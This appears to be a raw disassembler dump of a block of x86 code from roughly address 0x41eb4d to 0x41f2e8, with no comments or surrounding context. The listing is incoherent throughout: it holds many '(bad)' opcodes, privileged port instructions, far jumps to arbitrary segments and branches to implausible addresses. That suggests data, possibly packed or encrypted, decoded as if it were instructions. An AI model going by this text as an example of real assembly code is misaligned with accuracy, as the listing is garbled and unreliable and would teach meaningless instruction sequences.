  41eb4d:	jmp    0x41eb3a
  41eb4f:	mov    dh,0xb9
  41eb51:	(bad)  
  41eb52:	in     eax,dx
  41eb53:	(bad)  
  41eb54:	xlat   BYTE PTR ds:[ebx]
  41eb55:	(bad)  
  41eb57:	in     eax,dx
  41eb58:	icebp  
  41eb59:	aad    0xda
  41eb5b:	ret    0xe2e7
  41eb5e:	mov    esp,0xf7dbe6e1
  41eb63:	stc    
  41eb64:	(bad)  
  41eb66:	retf   
  41eb67:	enter  0xa8bc,0xc5
  41eb6b:	loop   0x41eb31
  41eb6d:	out    dx,eax
  41eb6e:	jmp    0x41eb50
  41eb70:	mov    ah,0xfb
  41eb72:	in     al,dx
  41eb73:	aam    0xe5
  41eb75:	(bad)  
  41eb76:	shl    bh,cl
  41eb78:	stc    
  41eb79:	int    0xc1
  41eb7b:	div    edx
  41eb7d:	loopne 0x41eb7f
  41eb7f:	in     eax,0xc4
  41eb81:	leave  
  41eb82:	(bad)  
  41eb84:	enter  0xcde5,0xd2
  41eb88:	mov    edi,0xe6b0d6c3
  41eb8d:	in     al,dx
  41eb8e:	(bad)
  41eb91:	jmp    0x41eb83
  41eb93:	std    
  41eb94:	jmp    0x41eb4b
  41eb96:	cmc    
  41eb97:	int    0xba
  41eb99:	out    dx,eax
  41eb9a:	(bad)  
  41eb9b:	aad    0xdd
  41eb9d:	aad    0xd4
  41eb9f:	stc    
  41eba0:	test   dl,0xd5
  41eba3:	(bad)  
  41eba4:	call   0xab3ce882
  41eba9:	jecxz  0x41eb6d
  41ebab:	mov    bl,0xb0
  41ebad:	loope  0x41eb94
  41ebaf:	jmp    0xe4b7:0xddcdaeca
  41ebb6:	std    
  41ebb7:	int    0xbd
  41ebb9:	ret    
  41ebba:	lock mov esp,0xd7c5de03
  41ebc0:	(bad)  
  41ebc2:	(bad)  
  41ebc3:	(bad)  
  41ebc4:	in     al,dx
  41ebc5:	repz jecxz 0x41eba2
  41ebc8:	mov    esp,0xd4e6b1df
  41ebcd:	in     eax,0xb0
  41ebcf:	mov    ah,0xb7
  41ebd1:	mov    ecx,0xf7dee5d3
  41ebd6:	hlt    
  41ebd7:	(bad)  
  41ebd9:	(bad)  
  41ebdb:	add    esp,edi
  41ebdd:	(bad)  
  41ebde:	repz fxch st(3)
  41ebe1:	add    edx,esi
  41ebe3:	out    0xd5,al
  41ebe5:	add    dl,bl
  41ebe7:	fisubr DWORD PTR [esi-0x3f411e12]
  41ebed:	stos   BYTE PTR es:[edi],al
  41ebee:	cli    
  41ebef:	shl    bh,cl
  41ebf1:	enter  0xacf5,0xe8
  41ebf5:	mov    edi,0xb8d2fd03
  41ebfa:	out    0xdb,al
  41ebfc:	cld    
  41ebfd:	hlt    
  41ebfe:	ret    
  41ebff:	loop   0x41ec02
  41ec01:	in     eax,0x7
  41ec03:	retf   
  41ec04:	in     al,0xf3
  41ec06:	int3   
  41ec07:	cli    
  41ec08:	in     eax,dx
  41ec09:	in     al,0xc9
  41ec0b:	jmp    0xb529d6fa
  41ec10:	in     al,dx
  41ec11:	(bad)  
  41ec12:	mov    ch,0xd1
  41ec14:	int3   
  41ec15:	imul   dl
  41ec17:	ret    
  41ec18:	add    DWORD PTR [eax],eax
  41ec1a:	icebp  
  41ec1b:	(bad)  
  41ec1d:	jmp    edx
  41ec1f:	inc    BYTE PTR [ecx]
  41ec21:	stc    
  41ec22:	fsubrp st(7),st
  41ec24:	in     al,0xef
  41ec26:	fucomip st,st(5)
  41ec28:	jmp    0x41ec06
  41ec2a:	test   eax,0xace2ddb3
  41ec2f:	mov    edx,0xe6bfb4af
  41ec34:	out    dx,al
  41ec35:	cmc    
  41ec36:	lock out dx,eax
  41ec38:	loope  0x41ec02
  41ec3a:	push   es
  41ec3b:	cmc    
  41ec3c:	loope  0x41ec2e
  41ec3e:	aam    0xbc
  41ec40:	add    esp,ebp
  41ec42:	add    edx,esi
  41ec44:	leave  
  41ec45:	faddp  st(5),st
  41ec47:	adc    ch,ch
  41ec49:	jecxz  0x41ec2e
  41ec4b:	in     eax,0xc5
  41ec4d:	int    0xe8
  41ec4f:	lods   al,BYTE PTR ds:[esi]
  41ec50:	mov    dh,0xec
  41ec52:	(bad)  
  41ec53:	sar    ebp,cl
  41ec55:	retf   
  41ec56:	mov    ch,0xf4
  41ec58:	aam    0xf2
  41ec5a:	add    BYTE PTR [esp+esi*8+0xbd2c3de],bh
  41ec61:	test   BYTE PTR [edi],0x6
  41ec64:	(bad)  
  41ec65:	inc    BYTE PTR [edi]
  41ec67:	jecxz  0x41ec4b
  41ec69:	xlat   BYTE PTR ds:[ebx]
  41ec6a:	shr    esi,cl
  41ec6c:	shr    ebp,0xe0
  41ec6f:	les    edi,FWORD PTR [ebx-0x4c2a3b12]
  41ec75:	jmp    0x41ec61
  41ec77:	mov    ah,0xdf
  41ec79:	add    bl,ah
  41ec7b:	fld    QWORD PTR [ecx]
  41ec7d:	add    al,0xbd
  41ec7f:	ret    
  41ec80:	leave  
  41ec81:	(bad)  
  41ec82:	hlt    
  41ec83:	fucom  st(1)
  41ec85:	add    ecx,ebx
  41ec87:	shr    DWORD PTR [ebp+ebp*8-0x350e0c2f],cl
  41ec8e:	enter  0xf4d6,0xd8
  41ec92:	lock iret 
  41ec94:	out    dx,al
  41ec95:	in     al,dx
  41ec96:	iret   
  41ec97:	(bad)  
  41ec98:	jmp    0xc835e35e
  41ec9d:	push   es
  41ec9e:	repz ret 0xe8c0
  41eca2:	pop    es
  41eca3:	out    0xd,eax
  41eca5:	aam    0xe2
  41eca7:	int3   
  41eca8:	lock mov dl,0xc2
  41ecab:	lock hlt 
  41ecad:	jmp    0xdb2cbd99
  41ecb2:	rol    ch,1
  41ecb4:	mov    ebx,0xdffccabc
  41ecb9:	in     al,dx
  41ecba:	out    dx,al
  41ecbb:	in     eax,0xdb
  41ecbd:	hlt    
  41ecbe:	out    0x3,eax
  41ecc0:	or     eax,eax
  41ecc2:	stc    
  41ecc3:	(bad)  
  41ecc4:	fld    DWORD PTR ds:0xbebf0bfd
  41ecca:	in     eax,0xea
  41eccc:	repnz test ecx,0xb0cfeccf
  41ecd3:	(bad)  
  41ecd4:	idiv   al
  41ecd6:	test   dl,0xd5
  41ecd9:	(bad)  
  41ecdb:	mov    esp,0xc0f9d102
  41ece0:	(bad)  
  41ece1:	aam    0xda
  41ece3:	push   es
  41ece4:	(bad)  
  41ece5:	out    dx,al
  41ece6:	fadd   DWORD PTR [esp+edi*4]
  41ece9:	int    0xb2
  41eceb:	mov    esi,0xf9ccebb3
  41ecf0:	mov    dh,0xf4
  41ecf2:	out    dx,al
  41ecf3:	fcmovne st,st(7)
  41ecf5:	jmp    0x1cf:0xd3bee3be
  41ecfc:	int3   
  41ecfd:	in     eax,0xd9
  41ecff:	aad    0xe3
  41ed01:	pop    es
  41ed02:	loopne 0x41ed08
  41ed04:	(bad)  
  41ed05:	fcomi  st,st(3)
  41ed07:	int    0xc7
  41ed09:	mov    dl,0xde
  41ed0b:	enter  0xcce8,0xcb
  41ed0f:	(bad)  
  41ed10:	icebp  
  41ed11:	xlat   BYTE PTR ds:[ebx]
  41ed12:	out    0xde,al
  41ed14:	lock (bad) 
  41ed16:	ror    dh,1
  41ed18:	cmc    
  41ed19:	mov    edi,0xc3ecc0cd
  41ed1e:	inc    DWORD PTR [ebx]
  41ed20:	fdivrp st(7),st
  41ed22:	fmul   QWORD PTR [esi]
  41ed24:	jmp    0xc3e5:0xedfa080d
  41ed2b:	scas   eax,DWORD PTR es:[edi]
  41ed2c:	jmp    0x41ecfc
  41ed2e:	jecxz  0x41ed19
  41ed30:	int    0xd0
  41ed32:	hlt    
  41ed33:	sti    
  41ed34:	lock in al,0xed
  41ed37:	mov    al,0xe0
  41ed39:	(bad)  
  41ed3b:	add    dh,bh
  41ed3d:	fcmovnb st,st(6)
  41ed3f:	or     ecx,DWORD PTR [ecx]
  41ed41:	clc    
  41ed42:	add    al,ah
  41ed44:	(bad)
  41ed47:	repz ror dl,0xe9
  41ed4b:	cmc    
  41ed4c:	test   bl,0xd4
  41ed4f:	shr    ch,0xbb
  41ed52:	div    DWORD PTR [edi-0x470e352a]
  41ed58:	(bad)  
  41ed59:	ror    bh,1
  41ed5b:	(bad)  
  41ed5c:	jecxz  0x41ed53
  41ed5e:	fild   DWORD PTR [eax]
  41ed60:	retf   0xd408
  41ed63:	leave  
  41ed64:	in     eax,dx
  41ed65:	std    
  41ed66:	repz add esi,DWORD PTR [ebx-0x371a2e22]
  41ed6d:	lock mov al,0xe1
  41ed70:	shr    ebx,cl
  41ed72:	mov    ch,0xf7
  41ed74:	jmp    0xf023d166
  41ed79:	int    0xec
  41ed7b:	aam    0x0
  41ed7d:	fstp   st(2)
  41ed7f:	add    al,0x4
  41ed81:	cld    
  41ed82:	(bad)  
  41ed83:	retf   
  41ed84:	(bad)  
  41ed86:	in     al,0xf9
  41ed88:	shl    ebp,0xad
  41ed8b:	mov    dh,0xe9
  41ed8d:	repz mov bh,0xce
  41ed90:	clc    
  41ed91:	in     eax,0xf2
  41ed93:	fcmovnu st,st(5)
  41ed95:	mov    ecx,0xe700feec
  41ed9a:	rol    bl,cl
  41ed9c:	icebp  
  41ed9d:	(bad)  
  41ed9f:	lock push es
  41eda1:	hlt    
  41eda2:	sti    
  41eda3:	clc    
  41eda4:	retf   
  41eda5:	or     al,0xca
  41eda7:	int3   
  41eda8:	mov    esp,0xb7d1adad
  41edad:	jmp    0xb82fb9a3
  41edb2:	iret   
  41edb3:	icebp  
  41edb4:	mov    bl,0xcf
  41edb6:	loop   0x41ed8b
  41edb8:	(bad)  
  41edb9:	out    dx,eax
  41edba:	out    0xd3,eax
  41edbc:	rol    BYTE PTR [edi],1
  41edbe:	jmp    0x5fd:0xed0dec5
  41edc5:	(bad)  
  41edc6:	jmp    0xf429bec4
  41edcb:	rol    eax,0xb0
  41edce:	mov    al,0xce
  41edd0:	lock aad 0xef
  41edd3:	mov    ecx,0xf9e9b4ec
  41edd8:	mov    ecx,0xbefad4f9
  41eddd:	xlat   BYTE PTR ds:[ebx]
  41edde:	aad    0xfc
  41ede0:	aam    0xdc
  41ede2:	iret   
  41ede3:	or     ecx,DWORD PTR [ebx]
  41ede5:	stc    
  41ede6:	add    BYTE PTR [edi],al
  41ede8:	fcomp  st(6)
  41edea:	repnz mov al,0xe2
  41eded:	int    0xc5
  41edef:	shl    BYTE PTR [edx-0x32082d36],0xb5
  41edf6:	stc    
  41edf7:	rcl    edx,cl
  41edf9:	out    0xc0,eax
  41edfb:	fld    DWORD PTR [ecx]
  41edfd:	in     al,0xf9
  41edff:	loope  0x41edc5
  41ee01:	psubq  mm3,mm0
  41ee04:	ret    
  41ee05:	adc    ecx,esi
  41ee07:	int    0xaf
  41ee09:	call   0xdd29d0bd
  41ee0e:	repz rcl bh,cl
  41ee11:	mov    ch,0xbf
  41ee13:	mov    ah,0xc5
  41ee15:	xlat   BYTE PTR ds:[ebx]
  41ee16:	jmp    0x41edf2
  41ee18:	sti    
  41ee19:	mov    ecx,0xf8d7c2be
  41ee1e:	out    0xb8,eax
  41ee20:	fcmove st,st(3)
  41ee22:	jmp    0xd0e6:0xe1e2d8e9
  41ee29:	ror    ebp,0xe9
  41ee2c:	mov    ch,0xae
  41ee2e:	les    esi,FWORD PTR [edx+ebp*8-0x160a1317]
  41ee35:	int    0xf9
  41ee37:	leave  
  41ee38:	aad    0xd1
  41ee3a:	lock out 0xdf,eax
  41ee3d:	xlat   BYTE PTR ds:[ebx]
  41ee3e:	loop   0x41ee3b
  41ee40:	cmc    
  41ee41:	(bad)  
  41ee42:	add    al,0xef
  41ee44:	aam    0xdd
  41ee46:	pop    es
  41ee47:	call   0xec259bf6
  41ee4c:	mov    dh,0xe5
  41ee4e:	in     eax,0xc7
  41ee50:	aam    0xec
  41ee52:	in     eax,dx
  41ee53:	cmc    
  41ee54:	jmp    0x3f5:0xf7fdf7ef
  41ee5b:	std    
  41ee5c:	(bad)  
  41ee5d:	cli    
  41ee5e:	add    cl,BYTE PTR [ecx]
  41ee60:	out    0xe0,eax
  41ee62:	or     bl,dl
  41ee64:	fsubr  st,st(4)
  41ee66:	in     eax,0xfe
  41ee68:	int3   
  41ee69:	iret   
  41ee6a:	retf   0xabaf
  41ee6d:	mov    bh,0xcd
  41ee6f:	fcmove st,st(5)
  41ee71:	mov    ch,0xbb
  41ee73:	out    0xed,al
  41ee75:	clc    
  41ee76:	jmp    0xf1f9:0xefddd2c2
  41ee7d:	ret    0xff0b
  41ee80:	add    eax,0xc703f9e6
  41ee85:	sti    
  41ee86:	iret   
  41ee87:	into   
  41ee88:	mov    ebp,0xe7b3a5c9
  41ee8d:	ret    0xf7f0
  41ee90:	repnz shl ch,0xbe
  41ee94:	not    al
  41ee96:	(bad)  
  41ee97:	mov    edx,0x7eec3ff
  41ee9c:	push   es
  41ee9d:	add    ecx,esi
  41ee9f:	fucom  st(6)
  41eea1:	or     al,BYTE PTR [edi]
  41eea3:	add    cl,ch
  41eea5:	push   es
  41eea6:	loope  0x41ee93
  41eea8:	iret   
  41eea9:	mov    cl,0xca
  41eeab:	(bad)  
  41eeac:	iret   
  41eead:	scas   al,BYTE PTR es:[edi]
  41eeae:	jmp    0x41ee9b
  41eeb0:	call   0xee0bb380
  41eeb5:	stc    
  41eeb6:	lock fdivr st(6),st
  41eeb9:	loopne 0x41ee8f
  41eebb:	clc    
  41eebc:	std    
  41eebd:	hlt    
  41eebe:	(bad)  
  41eebf:	jmp    0x709bf86
  41eec4:	jecxz  0x41ee95
  41eec6:	or     eax,edi
  41eec8:	shl    bl,1
  41eeca:	jmp    0x41eebd
  41eecc:	mov    cl,0xf7
  41eece:	(bad)  
  41eecf:	cli    
  41eed0:	enter  0xf6b8,0xcb
  41eed4:	aam    0xbc
  41eed6:	mov    ebp,0xd3f6fff1
  41eedb:	icebp  
  41eedc:	cli    
  41eedd:	mov    ebp,0x5d8d6c2
  41eee2:	add    esi,ebx
  41eee4:	fstp   st(7)
  41eee6:	adc    bh,dh
  41eee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eee9:	lods   eax,DWORD PTR ds:[esi]
  41eeea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeeb:	in     eax,0xe1
  41eeed:	int    0xbb
  41eeef:	out    dx,al
  41eef0:	cli    
  41eef1:	jmp    0xd1bd:0xe8cdb5f9
  41eef8:	stc    
  41eef9:	loope  0x41eeb7
  41eefb:	cld    
  41eefc:	int3   
  41eefd:	mov    esi,0xfcd1cbe6
  41ef02:	(bad)  
  41ef03:	fucomp st(4)
  41ef05:	retf   0xc80e
  41ef08:	sar    DWORD PTR [edi-0xb343751],1
  41ef0e:	mov    al,0xb2
  41ef10:	mov    dh,0xff
  41ef12:	enter  0xd2ff,0xe8
  41ef16:	jmp    0xb8ffbd09
  41ef1b:	ret    
  41ef1c:	cmc    
  41ef1d:	(bad)  
  41ef1f:	hlt    
  41ef20:	ret    
  41ef21:	clc    
  41ef22:	(bad)  
  41ef23:	iret   
  41ef24:	or     DWORD PTR [ebx],edx
  41ef26:	retf   
  41ef27:	rcl    edx,cl
  41ef29:	retf   
  41ef2a:	shl    bh,1
  41ef2c:	rcl    ecx,cl
  41ef2e:	ret    
  41ef2f:	in     eax,0xd5
  41ef31:	clc    
  41ef32:	mov    bh,0xe6
  41ef34:	repnz out dx,eax
  41ef36:	jmp    0x41ef2f
  41ef38:	cli    
  41ef39:	into   
  41ef3a:	in     eax,dx
  41ef3b:	into   
  41ef3c:	mov    esp,0xe7e906ba
  41ef41:	fcmovnu st,st(7)
  41ef43:	leave  
  41ef44:	fsubrp st(6),st
  41ef46:	jmp    0xabbe:0xccf7c4e6
  41ef4d:	xlat   BYTE PTR ds:[ebx]
  41ef4e:	loopne 0x41ef26
  41ef50:	fcomi  st,st(6)
  41ef52:	in     eax,dx
  41ef53:	mov    edx,0xb8fffffc
  41ef58:	repnz loopne 0x41ef13
  41ef5b:	out    dx,al
  41ef5c:	cli    
  41ef5d:	in     al,0xcb
  41ef5f:	fcmovnb st,st(0)
  41ef61:	jmp    0x41ef3b
  41ef63:	(bad)  
  41ef64:	clc    
  41ef65:	leave  
  41ef66:	out    0xd9,al
  41ef68:	(bad)  
  41ef6a:	int3   
  41ef6b:	enter  0xc3ee,0xe1
  41ef6f:	rcl    al,cl
  41ef71:	rol    ch,1
  41ef73:	stc    
  41ef74:	in     eax,dx
  41ef75:	div    bl
  41ef77:	fnop   
  41ef79:	std    
  41ef7a:	out    dx,eax
  41ef7b:	inc    BYTE PTR [edi]
  41ef7d:	std    
  41ef7e:	(bad)  
  41ef7f:	sti    
  41ef80:	aad    0xc7
  41ef82:	std    
  41ef83:	retf   
  41ef84:	iret   
  41ef85:	in     eax,0xca
  41ef87:	adc    DWORD PTR [esi+eiz*4-0x39391d3f],edi
  41ef8e:	mov    ebx,0xbbf9f2c6
  41ef93:	shl    ecx,1
  41ef95:	icebp  
  41ef96:	cli    
  41ef97:	(bad)  
  41ef98:	rol    edx,cl
  41ef9a:	fucomp st(5)
  41ef9c:	sar    DWORD PTR [ebx+eax*1-0x15f91f26],1
  41efa3:	retf   
  41efa4:	fisttp QWORD PTR [ebx]
  41efa6:	or     al,0xcb
  41efa8:	fxch   st(1)
  41efaa:	mov    bh,0xea
  41efac:	shl    ebx,cl
  41efae:	icebp  
  41efaf:	mov    ebx,0xd3c6dffa
  41efb4:	mov    edx,0xbfcddfee
  41efb9:	sti    
  41efba:	push   es
  41efbb:	loop   0x41efaa
  41efbd:	repnz xlat BYTE PTR ds:[ebx]
  41efbf:	repnz add ecx,DWORD PTR [ebx]
  41efc2:	vpaddb xmm7,xmm3,xmm2
  41efc6:	loop   0x41efd6
  41efc8:	out    0xd3,al
  41efca:	scas   eax,DWORD PTR es:[edi]
  41efcb:	enter  0xb2e7,0xe2
  41efcf:	out    0xc5,eax
  41efd1:	(bad)  
  41efd2:	out    dx,al
  41efd3:	icebp  
  41efd4:	repz sar BYTE PTR [edx-0x10094330],cl
  41efdb:	rcl    al,cl
  41efdd:	jecxz  0x41efb4
  41efdf:	rol    edx,0xdd
  41efe2:	(bad)  
  41efe3:	retf   
  41efe4:	loop   0x41efc6
  41efe6:	iret   
  41efe7:	add    eax,eax
  41efe9:	loop   0x41efd0
  41efeb:	out    dx,al
  41efec:	(bad)  
  41efed:	in     eax,0xe5
  41efef:	mov    bl,0xcf
  41eff1:	(bad)
  41eff4:	shr    bl,cl
  41eff6:	aad    0xf6
  41eff8:	push   esi
  41effa:	fld    QWORD PTR ds:0xb80200f6
  41f000:	push   es
  41f001:	pop    es
  41f002:	stc    
  41f003:	mov    dh,0xec
  41f006:	jmp    0xc12999cf
  41f00b:	in     eax,dx
  41f00c:	aad    0xe1
  41f00e:	loopne 0x41f00a
  41f010:	loope  0x41f002
  41f012:	stc    
  41f013:	fcmovnbe st,st(7)
  41f015:	shr    ebx,cl
  41f017:	icebp  
  41f018:	in     eax,dx
  41f019:	rcl    eax,0xda
  41f01c:	add    al,0xf2
  41f01e:	fcmovnbe st,st(2)
  41f020:	fstp   st(1)
  41f022:	push   cs
  41f023:	sti    
  41f024:	in     eax,0xda
  41f026:	sti    
  41f027:	loopne 0x41efec
  41f029:	test   al,0xc9
  41f02b:	in     eax,0xc5
  41f02d:	sti    
  41f02e:	(bad)  
  41f02f:	loope  0x41f01c
  41f031:	repnz retf 
  41f033:	mov    ah,0xce
  41f035:	mov    dl,0xcc
  41f037:	test   BYTE PTR [ebx],0xfb
  41f03a:	sar    DWORD PTR [eax+0x2f8bdbc],cl
  41f040:	stc    
  41f041:	(bad)
  41f044:	cli    
  41f045:	add    ch,cl
  41f047:	or     ebp,ecx
  41f049:	fsubrp st(5),st
  41f04b:	(bad)  
  41f04c:	mov    cl,0xf7
  41f04e:	leave  
  41f04f:	mov    al,0xba
  41f051:	xlat   BYTE PTR ds:[ebx]
  41f052:	leave  
  41f053:	xlat   BYTE PTR ds:[ebx]
  41f054:	sti    
  41f055:	out    dx,al
  41f056:	jecxz  0x41f04c
  41f058:	add    bl,bl
  41f05a:	ffreep st(7)
  41f05c:	shl    edx,1
  41f05e:	fcmovb st,st(6)
  41f060:	ffree  st(7)
  41f062:	add    cl,dl
  41f064:	loopne 0x41f06f
  41f066:	retf   
  41f067:	in     al,dx
  41f068:	out    dx,eax
  41f069:	mov    esp,0xd6c5eddc
  41f06e:	mov    bl,0xc1
  41f070:	fldl2t 
  41f072:	(bad)  
  41f073:	sar    ebp,cl
  41f075:	iret   
  41f076:	fmul   st,st(7)
  41f078:	stc    
  41f079:	fucomip st,st(5)
  41f07b:	add    bl,ah
  41f07d:	rol    BYTE PTR [ecx],cl
  41f07f:	or     al,BYTE PTR [edi*8-0x24ff0401]
  41f086:	out    0xfc,eax
  41f088:	icebp  
  41f089:	jecxz  0x41f049
  41f08b:	imul   bh
  41f08d:	loope  0x41f080
  41f08f:	(bad)  
  41f090:	out    0xed,al
  41f092:	mov    eax,0xbae9dab4
  41f097:	sar    ah,cl
  41f099:	rcl    ah,0x6
  41f09c:	aam    0xfd
  41f09e:	ret    0xf4e4
  41f0a1:	(bad)  
  41f0a2:	fnsetpm(287 only) 
  41f0a4:	out    0xd9,eax
  41f0a6:	loopne 0x41f07a
  41f0a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0a9:	mov    eax,0xd7bdc1eb
  41f0ae:	(bad)  
  41f0af:	(bad)
  41f0b3:	aam    0xcf
  41f0b5:	sar    ebp,1
  41f0b7:	add    edi,edx
  41f0b9:	icebp  
  41f0ba:	rcr    ecx,cl
  41f0bc:	cld    
  41f0bd:	add    eax,0xfe1fdd4
  41f0c2:	(bad)  
  41f0c4:	cmc    
  41f0c5:	fucom  st(1)
  41f0c7:	repz ret 
  41f0c9:	mov    ebp,0xd5d5cde5
  41f0ce:	mov    ebx,0xe6f3b0c6
  41f0d3:	hlt    
  41f0d4:	retf   
  41f0d5:	ror    eax,cl
  41f0d7:	std    
  41f0d8:	mov    edx,0xe4d1f6df
  41f0dd:	add    eax,0xd4e6ddbc
  41f0e2:	or     BYTE PTR [ecx],al
  41f0e4:	jmp    0xee09f4b3
  41f0e9:	scas   al,BYTE PTR es:[edi]
  41f0ea:	in     eax,dx
  41f0eb:	in     al,dx
  41f0ec:	out    dx,eax
  41f0ed:	loopne 0x41f0a4
  41f0ef:	in     al,dx
  41f0f0:	repz out 0xcc,eax
  41f0f3:	mov    edi,0xb0fbf9c5
  41f0f8:	sti    
  41f0f9:	mov    eax,0xd8d3f3c2
  41f0fe:	std    
  41f0ff:	add    DWORD PTR [eax],ecx
  41f101:	enter  0xdc02,0xfb
  41f105:	int3   
  41f106:	(bad)  
  41f107:	faddp  st(3),st
  41f109:	shr    esi,cl
  41f10b:	lock mov ch,0xf4
  41f10f:	mov    ch,0xd4
  41f111:	enter  0xc9f1,0xe8
  41f115:	jmp    0xc0c0:0xd5f2bae9
  41f11c:	(bad)
  41f11f:	in     eax,0xc0
  41f121:	sar    bh,0xe4
  41f124:	retf   0xe4dd
  41f127:	or     ebp,ebx
  41f129:	jmp    0xf6f0:0xc3e4bee9
  41f130:	rcr    bh,1
  41f132:	repz fidivr WORD PTR [edi-0x3361d4e]
  41f139:	rcr    al,cl
  41f13b:	rcr    bh,1
  41f13d:	mov    esp,0xd4cad70a
  41f142:	sar    esi,0xdf
  41f145:	or     eax,0xe2b80dfc
  41f14a:	scas   al,BYTE PTR es:[edi]
  41f14b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f14c:	xlat   BYTE PTR ds:[ebx]
  41f14d:	out    dx,al
  41f14e:	mov    ebx,0xe8c7d1ba
  41f153:	mov    ch,0xeb
  41f155:	shr    ebx,1
  41f157:	mov    al,0xb8
  41f159:	not    ch
  41f15b:	mov    ebp,0xac3f1fa
  41f160:	jmp    0xe735fc42
  41f165:	pop    es
  41f166:	add    eax,esp
  41f168:	mov    bl,0xea
  41f16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f16b:	ror    dl,cl
  41f16d:	jmp    0x41f11b
  41f16f:	into   
  41f170:	(bad)  
  41f171:	mov    dl,0xc7
  41f173:	mov    esi,0xd3d4d4fc
  41f178:	mov    esp,0xcde5ccd8
  41f17d:	repz retf 
  41f17f:	loope  0x41f15e
  41f181:	add    cl,bh
  41f183:	add    esi,ebp
  41f185:	or     al,0x0
  41f187:	add    ah,ch
  41f189:	into   
  41f18a:	(bad)  
  41f18b:	repnz mov dh,0xe4
  41f18e:	lods   eax,DWORD PTR ds:[esi]
  41f18f:	mov    bl,0xf1
  41f191:	xlat   BYTE PTR ds:[ebx]
  41f192:	mov    bh,0xd5
  41f194:	fldlg2 
  41f196:	std    
  41f197:	mov    esi,0xe3d3cff6
  41f19c:	(bad)  
  41f19d:	rol    bl,cl
  41f19f:	retf   0xc9dd
  41f1a2:	fxch   st(1)
  41f1a4:	in     al,0xe1
  41f1a6:	fsubr  st,st(2)
  41f1a8:	stos   DWORD PTR es:[edi],eax
  41f1a9:	loope  0x41f181
  41f1ab:	lods   al,BYTE PTR ds:[esi]
  41f1ac:	mov    al,0xca
  41f1ae:	enter  0xafb4,0xe7
  41f1b2:	jmp    0xe3be:0xeedbb8ed
  41f1b9:	mov    ecx,0xf2dadeb9
  41f1be:	add    esp,edi
  41f1c0:	leave  
  41f1c1:	aam    0xf4
  41f1c3:	(bad)  
  41f1c4:	jecxz  0x41f1c8
  41f1c6:	or     al,0xa
  41f1c8:	fdivrp st(3),st
  41f1ca:	scas   eax,DWORD PTR es:[edi]
  41f1cb:	mov    ebp,0xf9b2ccb3
  41f1d0:	loopne 0x41f1cd
  41f1d2:	out    0xba,al
  41f1d4:	not    cl
  41f1d6:	sar    BYTE PTR [esi-0x2b083c0c],cl
  41f1dc:	add    eax,0xd7d5daf9
  41f1e1:	out    0xf5,eax
  41f1e3:	aam    0xfb
  41f1e5:	iret   
  41f1e6:	add    BYTE PTR [ebx],cl
  41f1e8:	(bad)  
  41f1ea:	loope  0x41f1b6
  41f1ec:	shr    dl,cl
  41f1ee:	into   
  41f1ef:	mov    cl,0xb7
  41f1f1:	loopne 0x41f1b8
  41f1f3:	repz call 0xe023c3dc
  41f1f9:	pop    es
  41f1fa:	aad    0xc3
  41f1fc:	add    ebx,esi
  41f1fe:	xlat   BYTE PTR ds:[ebx]
  41f1ff:	stc    
  41f200:	out    0xf8,eax
  41f202:	fcomip st,st(4)
  41f204:	cli    
  41f205:	out    0xc8,eax
  41f207:	cld    
  41f208:	iret   
  41f209:	fmulp  st(2),st
  41f20b:	lock mov ch,0xe5
  41f20e:	iret   
  41f20f:	hlt    
  41f210:	lock jmp 0x41f1ee
  41f213:	mov    dh,0xce
  41f215:	fxch   st(4)
  41f217:	cmc    
  41f218:	shl    eax,1
  41f21a:	(bad)  
  41f21b:	test   ebp,0xd8fae3
  41f221:	pop    es
  41f222:	cli    
  41f223:	(bad)  
  41f225:	pop    es
  41f226:	add    eax,0xd3d1ece1
  41f22b:	lds    ebp,FWORD PTR [esi-0x54c1233]
  41f231:	rcl    eax,1
  41f233:	(bad)  
  41f234:	cld    
  41f235:	sti    
  41f236:	clc    
  41f237:	ret    
  41f238:	(bad)  
  41f23a:	sti    
  41f23b:	mov    eax,0xd5d1dbbc
  41f240:	fild   WORD PTR [esi]
  41f242:	fimul  WORD PTR [edx]
  41f244:	leave  
  41f245:	enter  0xda07,0xce
  41f249:	jecxz  0x41f1fa
  41f24b:	mov    bl,0xcb
  41f24d:	cmc    
  41f24e:	retf   0xeee4
  41f251:	(bad)  
  41f252:	in     eax,dx
  41f253:	iret   
  41f254:	mov    ebp,0xedbdbbf8
  41f259:	mov    eax,0xc3fddebd
  41f25e:	neg    ch
  41f260:	lock out 0xc1,al
  41f263:	jmp    esi
  41f265:	paddb  mm1,mm1
  41f268:	shr    BYTE PTR [eax-0x1b3a4e51],cl
  41f26e:	mov    bh,0xb0
  41f270:	icebp  
  41f271:	in     al,0xe8
  41f273:	mov    eax,0xd9dfdaeb
  41f278:	lock ror ah,0xc2
  41f27c:	loopne 0x41f262
  41f27e:	fldl2e 
  41f280:	stc    
  41f281:	in     eax,0xdd
  41f283:	jmp    0xe710db91
  41f288:	test   eax,0xdcd1b2c1
  41f28d:	int    0xce
  41f28f:	into   
  41f290:	cli    
  41f291:	out    dx,eax
  41f292:	fpatan 
  41f294:	mov    ecx,0xede2f6ca
  41f299:	icebp  
  41f29a:	sar    BYTE PTR [eax-0x1e150b0b],0xff
  41f2a1:	add    al,0x7
  41f2a3:	(bad)  
  41f2a4:	fmul   st(0),st
  41f2a6:	repnz fsub st,st(0)
  41f2a9:	fmulp  st(5),st
  41f2ab:	retf   
  41f2ac:	call   0xd027d87f
  41f2b1:	mov    ecx,0xb5d4e8b0
  41f2b6:	mov    ebp,0xe0e7c2d2
  41f2bb:	clc    
  41f2bc:	xlat   BYTE PTR ds:[ebx]
  41f2bd:	mov    ebp,0x5fbd4e6
  41f2c2:	dec    DWORD PTR [esi]
  41f2c4:	add    BYTE PTR [ecx],al
  41f2c6:	or     ebx,ebp
  41f2c8:	rol    esp,cl
  41f2ca:	mov    esi,0xf5eac1c2
  41f2cf:	in     al,dx
  41f2d0:	sti    
  41f2d1:	fucomip st,st(5)
  41f2d3:	(bad)  
  41f2d4:	jmp    0xb8bc:0xfcf2fff7
  41f2db:	jecxz  0x41f2bd
  41f2dd:	jmp    0x41f2b0
  41f2df:	(bad)  
  41f2e0:	(bad)  
  41f2e2:	leave  
  41f2e3:	sti    
  41f2e4:	out    dx,al
  41f2e5:	in     eax,dx
  41f2e6:	jmp    0x41f2c7
  41f2e8:	shl    bh,1
